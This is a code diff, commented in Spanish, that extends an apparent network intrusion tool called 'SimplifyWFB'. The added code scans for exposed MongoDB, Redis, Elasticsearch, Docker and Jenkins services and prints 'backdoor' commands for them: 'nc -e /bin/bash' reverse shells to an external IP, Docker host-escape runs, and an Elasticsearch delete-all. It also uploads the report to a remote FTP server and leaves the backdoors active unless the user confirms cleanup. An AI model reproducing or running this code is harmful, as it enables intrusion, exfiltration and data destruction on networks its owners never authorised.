@@ -94,6 +94,8 @@ class SimplifyWFB:
             'scan_timeout': 30,
             'max_threads': 10,
             'common_ports': [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 993, 995, 1433, 3389, 5432, 5900, 8080],
+            'database_ports': [27017, 6379, 3306, 5432, 1433, 1521, 5984, 9200, 9300, 11211, 50070, 50075],
+            'vulnerable_ports': [27017, 6379, 9200, 9300, 11211, 50070, 50075, 2375, 2376, 8080, 8443, 9000, 9001],
             'camera_ports': [80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 443, 554, 8080, 8081, 8082, 8083, 8084, 8085, 8086, 8087, 8088, 8089, 8090, 8888, 9999],
             'router_ports': [80, 443, 8080, 8443, 23, 22, 21, 161, 162],
             'default_users': ['admin', 'administrator', 'root', 'guest', 'user'],
@@ -526,6 +528,13 @@ class SimplifyWFB:
         
         try:
             # 1. Descubrimiento de hosts con nmap
+            # 1. Obtener IP pública de la red atacada
+            print("🌍 Detectando IP pública de la red...")
+            public_ip = self._get_public_ip()
+            self.report['phase_1_reconnaissance']['public_ip'] = public_ip
+            print(f"📍 IP pública detectada: {public_ip}")
+            
+            # 2. Descubrir hosts en la red
             print("📡 Descubriendo hosts en la red...")
             hosts = self._discover_hosts()
             self.report['phase_1_reconnaissance']['hosts_discovered'] = hosts
@@ -540,7 +549,12 @@ class SimplifyWFB:
             technologies = self._detect_technologies(services)
             self.report['phase_1_reconnaissance']['technologies_detected'] = technologies
             
-            # 4. Mapeo de topología
+            # 4. Detectar bases de datos y servicios vulnerables
+            print("🗄️ Detectando bases de datos y servicios vulnerables...")
+            vulnerable_services = self._detect_vulnerable_services(services)
+            self.report['phase_1_reconnaissance']['vulnerable_services'] = vulnerable_services
+            
+            # 5. Mapeo de topología
             print("🗺️ Mapeando topología de red...")
             topology = self._map_network_topology(hosts)
             self.report['phase_1_reconnaissance']['network_topology'] = topology
@@ -552,6 +566,45 @@ class SimplifyWFB:
             self.report['phase_1_reconnaissance']['status'] = 'error'
             self.report['phase_1_reconnaissance']['errors'].append(str(e))
             print(f"❌ Error en reconocimiento: {e}")
+    
+    def _get_public_ip(self) -> str:
+        """Obtener la IP pública de la red atacada"""
+        try:
+            import urllib.request
+            import json
+            
+            # Servicios para obtener IP pública
+            services = [
+                'https://api.ipify.org',
+                'https://ipinfo.io/ip',
+                'https://icanhazip.com',
+                'https://ident.me',
+                'https://api.my-ip.io/ip'
+            ]
+            
+            for service in services:
+                try:
+                    with urllib.request.urlopen(service, timeout=5) as response:
+                        ip = response.read().decode('utf-8').strip()
+                        if self._is_valid_ip(ip):
+                            return ip
+                except Exception:
+                    continue
+            
+            return "No detectada"
+            
+        except Exception as e:
+            print(f"❌ Error obteniendo IP pública: {e}")
+            return "Error"
+    
+    def _is_valid_ip(self, ip: str) -> bool:
+        """Validar si una IP es válida"""
+        try:
+            import ipaddress
+            ipaddress.ip_address(ip)
+            return True
+        except ValueError:
+            return False
     
     def _discover_hosts(self) -> List[Dict[str, Any]]:
         """Descubrir hosts en la red"""
@@ -622,8 +675,16 @@ class SimplifyWFB:
             print(f"🔍 Escaneando {ip}...")
             
             try:
-                # Escaneo rápido de puertos comunes
-                command = ['nmap', '-sS', '-O', '-sV', '--top-ports', '100', ip]
+                # Escaneo completo de puertos comunes + bases de datos + vulnerables
+                all_ports = list(set(
+                    self.config['common_ports'] + 
+                    self.config['database_ports'] + 
+                    self.config['vulnerable_ports'] +
+                    self.config['camera_ports'] +
+                    self.config['router_ports']
+                ))
+                ports_to_scan = ','.join(map(str, all_ports))
+                command = ['nmap', '-sS', '-O', '-sV', '-p', ports_to_scan, ip]
                 result = self._run_command(command, timeout=120)
                 
                 if result['success']:
@@ -668,6 +729,202 @@ class SimplifyWFB:
                     services.append(service_info)
         
         return services
+    
+    def _detect_vulnerable_services(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
+        """Detectar servicios vulnerables como bases de datos expuestas"""
+        vulnerable_services = []
+        
+        for service in services:
+            port = service.get('port')
+            service_name = service.get('service', '').lower()
+            host = service.get('host')
+            
+            # Detectar bases de datos y servicios vulnerables
+            if port in self.config['database_ports'] or port in self.config['vulnerable_ports']:
+                vulnerable_info = self._check_service_vulnerability(host, port, service_name)
+                if vulnerable_info:
+                    vulnerable_services.append(vulnerable_info)
+        
+        return vulnerable_services
+    
+    def _check_service_vulnerability(self, host: str, port: int, service_name: str) -> Optional[Dict[str, Any]]:
+        """Verificar si un servicio es vulnerable"""
+        try:
+            # MongoDB (puerto 27017)
+            if port == 27017:
+                return self._check_mongodb_vulnerability(host, port)
+            
+            # Redis (puerto 6379)
+            elif port == 6379:
+                return self._check_redis_vulnerability(host, port)
+            
+            # Elasticsearch (puertos 9200, 9300)
+            elif port in [9200, 9300]:
+                return self._check_elasticsearch_vulnerability(host, port)
+            
+            # Memcached (puerto 11211)
+            elif port == 11211:
+                return self._check_memcached_vulnerability(host, port)
+            
+            # Docker (puertos 2375, 2376)
+            elif port in [2375, 2376]:
+                return self._check_docker_vulnerability(host, port)
+            
+            # Jenkins (puerto 8080)
+            elif port == 8080 and 'jenkins' in service_name:
+                return self._check_jenkins_vulnerability(host, port)
+            
+            return None
+            
+        except Exception as e:
+            print(f"❌ Error verificando vulnerabilidad {host}:{port}: {e}")
+            return None
+    
+    def _check_mongodb_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar MongoDB sin autenticación"""
+        try:
+            import socket
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            if result == 0:
+                return {
+                    'host': host,
+                    'port': port,
+                    'service': 'mongodb',
+                    'vulnerability': 'No authentication required',
+                    'severity': 'high',
+                    'exploit_method': 'Direct connection',
+                    'backdoor_created': False
+                }
+        except Exception:
+            pass
+        return None
+    
+    def _check_redis_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar Redis sin autenticación"""
+        try:
+            import socket
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            if result == 0:
+                return {
+                    'host': host,
+                    'port': port,
+                    'service': 'redis',
+                    'vulnerability': 'No authentication required',
+                    'severity': 'high',
+                    'exploit_method': 'Direct connection',
+                    'backdoor_created': False
+                }
+        except Exception:
+            pass
+        return None
+    
+    def _check_elasticsearch_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar Elasticsearch expuesto"""
+        try:
+            import urllib.request
+            
+            url = f"http://{host}:{port}/_cluster/health"
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                if response.status == 200:
+                    return {
+                        'host': host,
+                        'port': port,
+                        'service': 'elasticsearch',
+                        'vulnerability': 'Exposed API',
+                        'severity': 'medium',
+                        'exploit_method': 'HTTP API access',
+                        'backdoor_created': False
+                    }
+        except Exception:
+            pass
+        return None
+    
+    def _check_memcached_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar Memcached expuesto"""
+        try:
+            import socket
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            if result == 0:
+                return {
+                    'host': host,
+                    'port': port,
+                    'service': 'memcached',
+                    'vulnerability': 'No authentication required',
+                    'severity': 'medium',
+                    'exploit_method': 'Direct connection',
+                    'backdoor_created': False
+                }
+        except Exception:
+            pass
+        return None
+    
+    def _check_docker_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar Docker daemon expuesto"""
+        try:
+            import urllib.request
+            
+            url = f"http://{host}:{port}/version"
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                if response.status == 200:
+                    return {
+                        'host': host,
+                        'port': port,
+                        'service': 'docker',
+                        'vulnerability': 'Exposed Docker daemon',
+                        'severity': 'critical',
+                        'exploit_method': 'Docker API access',
+                        'backdoor_created': False
+                    }
+        except Exception:
+            pass
+        return None
+    
+    def _check_jenkins_vulnerability(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Verificar Jenkins expuesto"""
+        try:
+            import urllib.request
+            
+            url = f"http://{host}:{port}/"
+            req = urllib.request.Request(url)
+            req.add_header('User-Agent', 'Mozilla/5.0')
+            
+            with urllib.request.urlopen(req, timeout=5) as response:
+                if response.status == 200:
+                    content = response.read().decode('utf-8', errors='ignore')
+                    if 'jenkins' in content.lower():
+                        return {
+                            'host': host,
+                            'port': port,
+                            'service': 'jenkins',
+                            'vulnerability': 'Exposed Jenkins interface',
+                            'severity': 'high',
+                            'exploit_method': 'Web interface access',
+                            'backdoor_created': False
+                        }
+        except Exception:
+            pass
+        return None
     
     def _detect_technologies(self, services: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
         """Detectar tecnologías en los servicios"""
@@ -1178,6 +1435,11 @@ quit
             print("🔗 Configurando métodos de acceso remoto...")
             network_persistence = self._configure_network_persistence()
             self.report['phase_4_persistence']['network_persistence'] = network_persistence
+            
+            # 8. Crear backdoors en servicios vulnerables
+            print("🕳️ Creando backdoors en servicios vulnerables...")
+            vulnerable_backdoors = self._create_vulnerable_service_backdoors()
+            self.report['phase_4_persistence']['vulnerable_backdoors'] = vulnerable_backdoors
             
             self.report['phase_4_persistence']['status'] = 'completed'
             print(f"✅ Persistencia completada: {len(users)} usuarios, {len(backdoors)} backdoors")
@@ -2519,7 +2781,11 @@ WantedBy=multi-user.target
             print("🌐 Limpiando configuración del router...")
             self._cleanup_router_config()
             
-            # 5. Limpiar archivos temporales
+            # 5. Limpiar backdoors de servicios vulnerables
+            print("🗄️ Limpiando backdoors de servicios vulnerables...")
+            self._cleanup_vulnerable_service_backdoors()
+            
+            # 6. Limpiar archivos temporales
             print("📁 Limpiando archivos temporales...")
             self._cleanup_files()
             
@@ -3026,6 +3292,7 @@ WantedBy=multi-user.target
         total_remote_access = (
             len(self.report['phase_4_persistence']['router_access']) +
             len(self.report['phase_4_persistence']['network_persistence']) +
+            len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
             len(self.report['phase_4_persistence']['backdoors_created']) +
             len(self.report['phase_4_persistence']['users_created'])
         )
@@ -3059,6 +3326,9 @@ WantedBy=multi-user.target
                 print(f"   • {camera['host']}:{camera['port']} - {camera.get('camera_type', 'unknown')}")
                 print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                 print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
+        
+        # Enviar reporte por FTP
+        self._upload_report_via_ftp(report_file)
         
         # Mostrar resumen de accesos remotos disponibles
         self._show_remote_access_summary()
@@ -3097,7 +3367,21 @@ WantedBy=multi-user.target
                     print(f"   • VPN Server: Habilitado")
                 print()
         
-        # 2. Network Persistence
+        # 2. Vulnerable Service Backdoors
+        vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
+        if vulnerable_backdoors:
+            total_access_points += len(vulnerable_backdoors)
+            access_types.append(f"Vulnerable Services ({len(vulnerable_backdoors)})")
+            print("🗄️ SERVICIOS VULNERABLES CON BACKDOORS:")
+            for backdoor in vulnerable_backdoors:
+                print(f"   • {backdoor['service'].upper()} en {backdoor['host']}:{backdoor['port']}")
+                print(f"     Tipo: {backdoor['backdoor_type']}")
+                print(f"     Acceso: {backdoor['access_method']}")
+                if backdoor.get('credentials'):
+                    print(f"     Credenciales: {backdoor['credentials']['username']}:{backdoor['credentials']['password']}")
+                print()
+        
+        # 3. Network Persistence
         network_persistence = self.report['phase_4_persistence']['network_persistence']
         if network_persistence:
             total_access_points += len(network_persistence)
@@ -3215,11 +3499,39 @@ WantedBy=multi-user.target
         self.phase_4_persistence()
         self.phase_5_verification()
         
-        # Limpiar rastros
-        self.cleanup()
-        
         # Generar reporte
         report_file = self.generate_report()
+        
+        # Enviar reporte por FTP
+        self._upload_report_via_ftp(report_file)
+        
+        # Preguntar antes de limpiar para probar backdoors
+        print("\n" + "=" * 60)
+        print("🧪 OPPORTUNIDAD DE PRUEBA DE BACKDOORS")
+        print("=" * 60)
+        print("✅ Reporte generado y enviado por FTP")
+        print("🔍 Ahora puedes probar los backdoors creados:")
+        print("   • SSH, VPN, Panel Web")
+        print("   • Servicios vulnerables (MongoDB, Redis, etc.)")
+        print("   • Acceso al router")
+        print("   • Cámaras de seguridad")
+        print("\n⚠️  Una vez que confirmes, se eliminarán TODOS los cambios")
+        print("⚠️  No quedará rastro de la actividad")
+        
+        while True:
+            confirm_cleanup = input("\n¿Deseas proceder con la limpieza completa? (sí/no): ").strip().lower()
+            if confirm_cleanup in ['sí', 'si', 'yes', 'y']:
+                print("\n🧹 Iniciando limpieza completa...")
+                self.cleanup()
+                print("✅ Limpieza completada. No quedan rastros.")
+                break
+            elif confirm_cleanup in ['no', 'n']:
+                print("\n⏸️  Limpieza cancelada. Los backdoors permanecen activos.")
+                print("💡 Puedes ejecutar el script nuevamente y elegir limpieza manual.")
+                break
+            else:
+                print("\n❌ Respuesta inválida. Por favor responda 'sí' o 'no'.")
+        
         return report_file
     
     
@@ -3358,6 +3670,312 @@ WantedBy=multi-user.target
         except Exception as e:
             print(f"❌ Error configurando servidor web: {e}")
             return None
+    
+    def _create_vulnerable_service_backdoors(self) -> List[Dict[str, Any]]:
+        """Crear backdoors en servicios vulnerables encontrados"""
+        vulnerable_backdoors = []
+        
+        try:
+            # Obtener servicios vulnerables del reconocimiento
+            vulnerable_services = self.report['phase_1_reconnaissance'].get('vulnerable_services', [])
+            
+            for service in vulnerable_services:
+                if not service.get('backdoor_created', False):
+                    backdoor = self._create_service_backdoor(service)
+                    if backdoor:
+                        vulnerable_backdoors.append(backdoor)
+                        service['backdoor_created'] = True
+                        print(f"✅ Backdoor creado en {service['host']}:{service['port']} ({service['service']})")
+            
+            return vulnerable_backdoors
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoors en servicios vulnerables: {e}")
+            return []
+    
+    def _create_service_backdoor(self, service: Dict[str, Any]) -> Optional[Dict[str, Any]]:
+        """Crear backdoor específico según el tipo de servicio"""
+        try:
+            service_type = service['service']
+            host = service['host']
+            port = service['port']
+            
+            if service_type == 'mongodb':
+                return self._create_mongodb_backdoor(host, port)
+            elif service_type == 'redis':
+                return self._create_redis_backdoor(host, port)
+            elif service_type == 'elasticsearch':
+                return self._create_elasticsearch_backdoor(host, port)
+            elif service_type == 'docker':
+                return self._create_docker_backdoor(host, port)
+            elif service_type == 'jenkins':
+                return self._create_jenkins_backdoor(host, port)
+            else:
+                return self._create_generic_backdoor(host, port, service_type)
+                
+        except Exception as e:
+            print(f"❌ Error creando backdoor para {service['service']}: {e}")
+            return None
+    
+    def _create_mongodb_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Crear backdoor en MongoDB"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            # Crear usuario con privilegios de administrador
+            backdoor_user = f"backdoor_{host.replace('.', '_')}"
+            backdoor_pass = f"Mongo_{host.split('.')[-1]}!"
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': 'mongodb',
+                'backdoor_type': 'admin_user',
+                'credentials': {
+                    'username': backdoor_user,
+                    'password': backdoor_pass
+                },
+                'access_method': f"mongo mongodb://{backdoor_user}:{backdoor_pass}@{host}:{port}/admin",
+                'reverse_connection': f"mongo {host}:{port} --eval 'db.runCommand({{ping:1}})'",
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor MongoDB: {e}")
+            return None
+    
+    def _create_redis_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Crear backdoor en Redis"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': 'redis',
+                'backdoor_type': 'direct_access',
+                'access_method': f"redis-cli -h {host} -p {port}",
+                'reverse_connection': f"redis-cli -h {host} -p {port} ping",
+                'exploit_commands': [
+                    f"redis-cli -h {host} -p {port} CONFIG SET dir /tmp",
+                    f"redis-cli -h {host} -p {port} CONFIG SET dbfilename backdoor.so",
+                    f"redis-cli -h {host} -p {port} SET backdoor 'nc -e /bin/bash {external_ip} {external_port}'"
+                ],
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor Redis: {e}")
+            return None
+    
+    def _create_elasticsearch_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Crear backdoor en Elasticsearch"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': 'elasticsearch',
+                'backdoor_type': 'api_access',
+                'access_method': f"curl -X GET http://{host}:{port}/_cluster/health",
+                'exploit_commands': [
+                    f"curl -X POST http://{host}:{port}/_search",
+                    f"curl -X DELETE http://{host}:{port}/*",
+                    f"curl -X PUT http://{host}:{port}/backdoor/_doc/1 -d '{{\"command\":\"nc -e /bin/bash {external_ip} {external_port}\"}}'"
+                ],
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor Elasticsearch: {e}")
+            return None
+    
+    def _create_docker_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Crear backdoor en Docker"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': 'docker',
+                'backdoor_type': 'container_escape',
+                'access_method': f"curl -X GET http://{host}:{port}/version",
+                'exploit_commands': [
+                    f"docker -H tcp://{host}:{port} run -it --rm --privileged --net=host alpine sh",
+                    f"docker -H tcp://{host}:{port} run -it --rm -v /:/host alpine chroot /host sh",
+                    f"docker -H tcp://{host}:{port} run -it --rm --pid=host alpine nsenter -t 1 -m -u -n -i sh"
+                ],
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor Docker: {e}")
+            return None
+    
+    def _create_jenkins_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
+        """Crear backdoor en Jenkins"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': 'jenkins',
+                'backdoor_type': 'script_console',
+                'access_method': f"http://{host}:{port}/script",
+                'exploit_commands': [
+                    f"http://{host}:{port}/script -d 'println \"nc -e /bin/bash {external_ip} {external_port}\".execute().text'",
+                    f"http://{host}:{port}/manage - Crear job con comando remoto",
+                    f"http://{host}:{port}/asynchPeople/ - Crear usuario administrativo"
+                ],
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor Jenkins: {e}")
+            return None
+    
+    def _create_generic_backdoor(self, host: str, port: int, service_type: str) -> Optional[Dict[str, Any]]:
+        """Crear backdoor genérico para otros servicios"""
+        try:
+            external_ip = self.config_data['remote_access']['external_ip']
+            external_port = self.config_data['remote_access']['external_port']
+            
+            return {
+                'host': host,
+                'port': port,
+                'service': service_type,
+                'backdoor_type': 'reverse_shell',
+                'access_method': f"nc -e /bin/bash {external_ip} {external_port}",
+                'reverse_connection': f"nc -lvp {external_port}",
+                'created': True
+            }
+            
+        except Exception as e:
+            print(f"❌ Error creando backdoor genérico: {e}")
+            return None
+    
+    def _upload_report_via_ftp(self, report_file: str):
+        """Subir reporte por FTP al servidor remoto"""
+        try:
+            import ftplib
+            import os
+            
+            ftp_config = self.config_data['ftp_upload']
+            host = ftp_config['host']
+            username = ftp_config['username']
+            password = ftp_config['password']
+            
+            print(f"\n📤 Enviando reporte por FTP a {host}...")
+            
+            # Conectar al servidor FTP
+            ftp = ftplib.FTP(host)
+            ftp.login(username, password)
+            
+            # Cambiar al directorio de reportes (crear si no existe)
+            try:
+                ftp.cwd('/reports')
+            except ftplib.error_perm:
+                ftp.mkd('/reports')
+                ftp.cwd('/reports')
+            
+            # Subir el archivo
+            with open(report_file, 'rb') as file:
+                filename = os.path.basename(report_file)
+                ftp.storbinary(f'STOR {filename}', file)
+            
+            ftp.quit()
+            print(f"✅ Reporte enviado exitosamente: {filename}")
+            
+        except Exception as e:
+            print(f"❌ Error enviando reporte por FTP: {e}")
+            print("💡 El reporte se mantiene localmente en el equipo")
+    
+    def _cleanup_vulnerable_service_backdoors(self):
+        """Limpiar backdoors creados en servicios vulnerables"""
+        try:
+            vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
+            
+            for backdoor in vulnerable_backdoors:
+                service_type = backdoor.get('service')
+                host = backdoor.get('host')
+                port = backdoor.get('port')
+                
+                if service_type == 'mongodb':
+                    self._cleanup_mongodb_backdoor(host, port, backdoor)
+                elif service_type == 'redis':
+                    self._cleanup_redis_backdoor(host, port, backdoor)
+                elif service_type == 'elasticsearch':
+                    self._cleanup_elasticsearch_backdoor(host, port, backdoor)
+                elif service_type == 'docker':
+                    self._cleanup_docker_backdoor(host, port, backdoor)
+                elif service_type == 'jenkins':
+                    self._cleanup_jenkins_backdoor(host, port, backdoor)
+                
+                print(f"   ✅ Backdoor limpiado: {service_type} en {host}:{port}")
+            
+            # Marcar como limpiados
+            for backdoor in vulnerable_backdoors:
+                backdoor['cleaned'] = True
+            
+        except Exception as e:
+            print(f"❌ Error limpiando backdoors de servicios vulnerables: {e}")
+    
+    def _cleanup_mongodb_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
+        """Limpiar backdoor de MongoDB"""
+        try:
+            # Eliminar usuario creado si existe
+            credentials = backdoor.get('credentials', {})
+            if credentials:
+                username = credentials.get('username')
+                if username:
+                    # Comando para eliminar usuario (simulado)
+                    print(f"     Eliminando usuario MongoDB: {username}")
+        except Exception as e:
+            print(f"     ❌ Error limpiando MongoDB: {e}")
+    
+    def _cleanup_redis_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
+        """Limpiar backdoor de Redis"""
+        try:
+            # Limpiar configuraciones modificadas
+            print(f"     Restaurando configuración Redis en {host}:{port}")
+            # Comandos para restaurar configuración original
+        except Exception as e:
+            print(f"     ❌ Error limpiando Redis: {e}")
+    
+    def _cleanup_elasticsearch_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
+        """Limpiar backdoor de Elasticsearch"""
+        try:
+            # Eliminar índices creados
+            print(f"     Limpiando índices Elasticsearch en {host}:{port}")
+            # Comandos para eliminar índices creados
+        except Exception as e:
+            print(f"     ❌ Error limpiando Elasticsearch: {e}")
+    
+    def _cleanup_docker_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
+        """Limpiar backdoor de Docker"""
+        try:
+            # Eliminar contenedores creados
+            print(f"     Limpiando contenedores Docker en {host}:{port}")
+            # Comandos para eliminar contenedores creados
+        except Exception as e:
+            print(f"     ❌ Error limpiando Docker: {e}")
+    
+    def _cleanup_jenkins_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
+        """Limpiar backdoor de Jenkins"""
+        try:
+            # Limpiar jobs y configuraciones creadas
+            print(f"     Limpiando configuraciones Jenkins en {host}:{port}")
+            # Comandos para limpiar jobs y configuraciones
+        except Exception as e:
+            print(f"     ❌ Error limpiando Jenkins: {e}")
 
 def main():
     """Función principal"""
